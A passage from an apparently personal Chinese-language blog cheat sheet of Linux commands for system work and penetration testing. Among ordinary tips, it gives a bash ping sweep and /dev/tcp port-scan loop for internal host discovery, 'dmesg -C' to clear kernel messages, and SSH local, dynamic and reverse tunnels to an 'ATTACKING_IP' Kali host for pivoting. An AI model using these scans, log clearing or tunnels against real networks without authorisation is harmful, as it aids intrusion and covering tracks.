+<h3 id="nohup"><a href="#nohup" class="headerlink" title="nohup"></a>nohup</h3><p>如果用ssh连接服务器，在ssh连接中断后，在ssh下开启的后台命令什么的都会被中断掉。但是有时候会有些任务持续的时间很长，那么可以使用nohup命令. 该命令可以在你退出帐户&#x2F;关闭终端之后继续运行相应的进程. nohup就是不挂起的意思。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup tcpdump -i eth0 -w a.pcap &amp;</span><br></pre></td></tr></table></figure>
+
+<p>之后tcpdump用户就会执行这个进程，在你ssh会话挂了之后此任务还会继续进行。</p>
+<h3 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">提取一段内容中的所有IP地址</span><br><span class="line">((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;</span><br><span class="line">判断字符串是否是IP地址</span><br><span class="line">^((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;$</span><br><span class="line">提取md5hash</span><br><span class="line">[0-9a-fA-F]&#123;32&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="mysql查询结果写到文件"><a href="#mysql查询结果写到文件" class="headerlink" title="mysql查询结果写到文件"></a>mysql查询结果写到文件</h3><h4 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(1) from table  into outfile &#x27;/tmp/test.xls&#x27;;</span><br></pre></td></tr></table></figure>
+<p>有可能就英文secure_file_priv或者是mysql权限的原因导致无法写入。</p>
+<h4 id="命令行写"><a href="#命令行写" class="headerlink" title="命令行写"></a>命令行写</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 127.0.0.1 -u root -p XXXX -P 3306 -e &quot;select * from database.table&quot;  &gt; /tmp/test/txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="ssh-keygen生产私钥对"><a href="#ssh-keygen生产私钥对" class="headerlink" title="ssh-keygen生产私钥对"></a>ssh-keygen生产私钥对</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen rsa 4096 -f a.key</span><br></pre></td></tr></table></figure>
+
+<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p>Unable to negotiate with 10.129.131.134 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g&#x3D;&#x3D;,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 a@1.1.1.1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Unable to negotiate with 10.255.252.1 port 22: no matching cipher found. Their offer: 3des-cbc</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc a@1.1.1.1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>supporat ssh-dss</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -oHostKeyAlgorithms=+ssh-dss -o PubkeyAcceptedKeyTypes=+ssh-dss a@1.1.1.1</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="CGI-BIN"><a href="#CGI-BIN" class="headerlink" title="CGI-BIN"></a>CGI-BIN</h3><p>常见后缀</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh,pl,py,cgi</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="Debian开启Crontab日志"><a href="#Debian开启Crontab日志" class="headerlink" title="Debian开启Crontab日志"></a>Debian开启Crontab日志</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/rsyslog.conf</span><br><span class="line"></span><br><span class="line">去掉cron.*的注释</span><br><span class="line"></span><br><span class="line">systemctl restart rsyslog</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Linux环境变量加载顺序"><a href="#Linux环境变量加载顺序" class="headerlink" title="Linux环境变量加载顺序"></a>Linux环境变量加载顺序</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/youyoui/p/10680329.html">https://www.cnblogs.com/youyoui/p/10680329.html</a></p>
+<ol>
+<li><code>/etc/environment</code></li>
+<li><code>/etc/profile</code></li>
+<li><code>/etc/bash.bashrc</code></li>
+<li><code>/etc/profile.d/test.sh</code></li>
+<li><code>~/.profile</code></li>
+<li><code>~/.bashrc</code></li>
+</ol>
+<h3 id="追进程"><a href="#追进程" class="headerlink" title="追进程"></a>追进程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pstree -sp $&#123;PID&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="dmesg-信息删除"><a href="#dmesg-信息删除" class="headerlink" title="dmesg 信息删除"></a>dmesg 信息删除</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dmesg -C</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Linux简易内网主机发现"><a href="#Linux简易内网主机发现" class="headerlink" title="Linux简易内网主机发现"></a>Linux简易内网主机发现</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;1..255&#125;; do (ping -c 1 192.168.1.$&#123;i&#125; | grep &quot;bytes from&quot; &amp;); done</span><br><span class="line"></span><br><span class="line">for i in &#123;1..65535&#125;; do (echo &gt; /dev/tcp/192.168.1.1/$i) &gt;/dev/null 2&gt;&amp;1 &amp;&amp; echo $i is open; done</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>SSH 本地端口转发</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN</span><br></pre></td></tr></table></figure>
+
+<p>动态</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 1337 user@172.16.0.5 -fN</span><br></pre></td></tr></table></figure>
+
+<p>远程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN</span><br><span class="line"></span><br><span class="line">ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/links/">Friends</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%94%A8%E6%88%B7-%E7%94%A8%E6%88%B7%E7%BB%84"><span class="toc-number">1.</span> <span class="toc-text">查看用户|用户组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA%E6%9F%90%E4%B8%AA%E6%96%87%E4%BB%B6%E7%9A%84%E7%AC%AC%E5%87%A0%E8%A1%8C"><span class="toc-number">2.</span> <span class="toc-text">显示某个文件的第几行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E6%96%87%E6%9C%AC%E6%8D%A2%E8%A1%8C%E7%AC%A6%E5%92%8C%E7%A9%BA%E6%A0%BC"><span class="toc-number">3.</span> <span class="toc-text">删除文本换行符和空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-%E4%B8%8B%E5%88%A0%E9%99%A4%E6%96%87%E6%9C%AC%E7%A9%BA%E8%A1%8C"><span class="toc-number">4.</span> <span class="toc-text">linux 下删除文本空行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#grep"><span class="toc-number">4.1.</span> <span class="toc-text">grep</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sed"><span class="toc-number">4.2.</span> <span class="toc-text">sed</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#awk"><span class="toc-number">4.3.</span> <span class="toc-text">awk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tr"><span class="toc-number">4.4.</span> <span class="toc-text">tr</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vim"><span class="toc-number">4.5.</span> <span class="toc-text">vim</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-shell-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%8D%E8%BD%AC-rev"><span class="toc-number">5.</span> <span class="toc-text">linux shell 字符串反转 rev</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-shell-base64"><span class="toc-number">6.</span> <span class="toc-text">linux shell base64</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BESUID%E4%BD%8D%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">7.</span> <span class="toc-text">查找SUID位的文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E6%9C%80%E5%A4%9A"><span class="toc-number">8.</span> <span class="toc-text">查找目录下的文件最多</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8BLinux%E5%86%85%E6%A0%B8-x2F-%E7%B3%BB%E7%BB%9F%E7%89%88%E6%9C%AC"><span class="toc-number">9.</span> <span class="toc-text">查看Linux内核&#x2F;系统版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#curl-%E9%83%A8%E5%88%86%E7%94%A8%E6%B3%95"><span class="toc-number">10.</span> <span class="toc-text">curl 部分用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wget%E9%83%A8%E5%88%86%E7%94%A8%E6%B3%95"><span class="toc-number">11.</span> <span class="toc-text">wget部分用法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E6%89%93%E5%BC%80tty%EF%BC%8Cnc%E5%8D%87%E7%BA%A7%E5%AE%8C%E5%85%A8%E4%BA%A4%E4%BA%92%E5%BC%8F%E7%9A%84TTY"><span class="toc-number">12.</span> <span class="toc-text">python打开tty，nc升级完全交互式的TTY</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python%E9%83%A8%E7%BD%B2%E7%AE%80%E6%98%93%E7%BD%91%E7%AB%99"><span class="toc-number">13.</span> <span class="toc-text">python部署简易网站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E9%AA%8C%E8%AF%81%E8%AF%81%E4%B9%A6%E8%BF%9B%E8%A1%8Chttps%E8%AF%B7%E6%B1%82"><span class="toc-number">14.</span> <span class="toc-text">不验证证书进行https请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AEterm"><span class="toc-number">15.</span> <span class="toc-text">设置term</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Arch-%E6%9F%A5%E8%AF%A2%E6%BB%9A%E4%BA%86%E5%A4%9A%E5%B0%91%E6%AC%A1-%E2%80%A6"><span class="toc-number">16.</span> <span class="toc-text">Arch 查询滚了多少次(…)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%E4%B8%AD%E4%B8%8D%E8%AE%B0%E5%BD%95%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4"><span class="toc-number">17.</span> <span class="toc-text">渗透过程中不记录历史命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E6%89%A7%E8%A1%8C"><span class="toc-number">18.</span> <span class="toc-text">无文件落地执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Dos%E6%A0%BC%E5%BC%8F%E6%96%87%E4%BB%B6%E5%BF%AB%E9%80%9F%E8%BD%AC%E4%B8%BAUnix"><span class="toc-number">19.</span> <span class="toc-text">Dos格式文件快速转为Unix</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E5%BF%AB%E9%80%9F%E7%BC%96%E8%A7%A3%E7%A0%81hex"><span class="toc-number">20.</span> <span class="toc-text">Linux 命令行下快速编解码hex</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E4%BD%BF%E7%94%A8impakcet%E5%BF%AB%E9%80%9F%E5%BC%80%E5%90%AF%E4%B8%80%E4%B8%AASMB%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95"><span class="toc-number">21.</span> <span class="toc-text">Linux使用impakcet快速开启一个SMB共享目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PIP%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">22.</span> <span class="toc-text">PIP下载文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#whois%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6"><span class="toc-number">23.</span> <span class="toc-text">whois传输文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%87%E6%8D%A2java%E7%89%88%E6%9C%AC"><span class="toc-number">24.</span> <span class="toc-text">切换java版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%9132%E4%BD%8D%E4%B8%94%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E6%96%87%E4%BB%B6%E5%BE%88%E8%80%81%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6"><span class="toc-number">25.</span> <span class="toc-text">编译32位且动态链接库文件很老的二进制文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nohup"><span class="toc-number">26.</span> <span class="toc-text">nohup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%88%99"><span class="toc-number">27.</span> <span class="toc-text">正则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C%E5%86%99%E5%88%B0%E6%96%87%E4%BB%B6"><span class="toc-number">28.</span> <span class="toc-text">mysql查询结果写到文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#into-outfile"><span class="toc-number">28.1.</span> <span class="toc-text">into outfile</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%86%99"><span class="toc-number">28.2.</span> <span class="toc-text">命令行写</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh-keygen%E7%94%9F%E4%BA%A7%E7%A7%81%E9%92%A5%E5%AF%B9"><span class="toc-number">29.</span> <span class="toc-text">ssh-keygen生产私钥对</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH"><span class="toc-number">30.</span> <span class="toc-text">SSH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CGI-BIN"><span class="toc-number">31.</span> <span class="toc-text">CGI-BIN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Debian%E5%BC%80%E5%90%AFCrontab%E6%97%A5%E5%BF%97"><span class="toc-number">32.</span> <span class="toc-text">Debian开启Crontab日志</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%A0%E8%BD%BD%E9%A1%BA%E5%BA%8F"><span class="toc-number">33.</span> <span class="toc-text">Linux环境变量加载顺序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%BD%E8%BF%9B%E7%A8%8B"><span class="toc-number">34.</span> <span class="toc-text">追进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dmesg-%E4%BF%A1%E6%81%AF%E5%88%A0%E9%99%A4"><span class="toc-number">35.</span> <span class="toc-text">dmesg 信息删除</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux%E7%AE%80%E6%98%93%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">36.</span> <span class="toc-text">Linux简易内网主机发现</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://atsud0.me/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://atsud0.me/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/&text=Linux部分实用命令"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://atsud0.me/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/&title=Linux部分实用命令"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Linux部分实用命令&body=Check out this article: https://atsud0.me/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://atsud0.me/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/&title=Linux部分实用命令"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://atsud0.me/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/&name=Linux部分实用命令&description=&lt;p&gt;linux部分命令速查 for me。&lt;/p&gt;
+&lt;a href=&#34;https://github.com/jlevy/the-art-of-command-line/blob/master/README-zh.md&#34; title=&#34;&#34; target=&#34;&#34;&gt;命令行的艺术&lt;/a&gt;
+
+&lt;a href=&#34;https://oscpnotes.infosecsanyam.in/My_OSCP_Preparation_Notes--Enumeration--OS--windows--basic_commands.html&#34; title=&#34;&#34; target=&#34;&#34;&gt;OSCP Notes&lt;/a&gt;
+
+
+
+&lt;p&gt;&lt;a href=&#34;https://explainshell.com/&#34;&gt;命令解释&lt;/a&gt;&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://atsud0.me/Linux%E9%83%A8%E5%88%86%E5%AE%9E%E7%94%A8%E5%91%BD%E4%BB%A4/&t=Linux部分实用命令"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2024
+    atsud0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/links/">Friends</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "069018536ef0421ebc5bb5e449328773"}'></script>
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
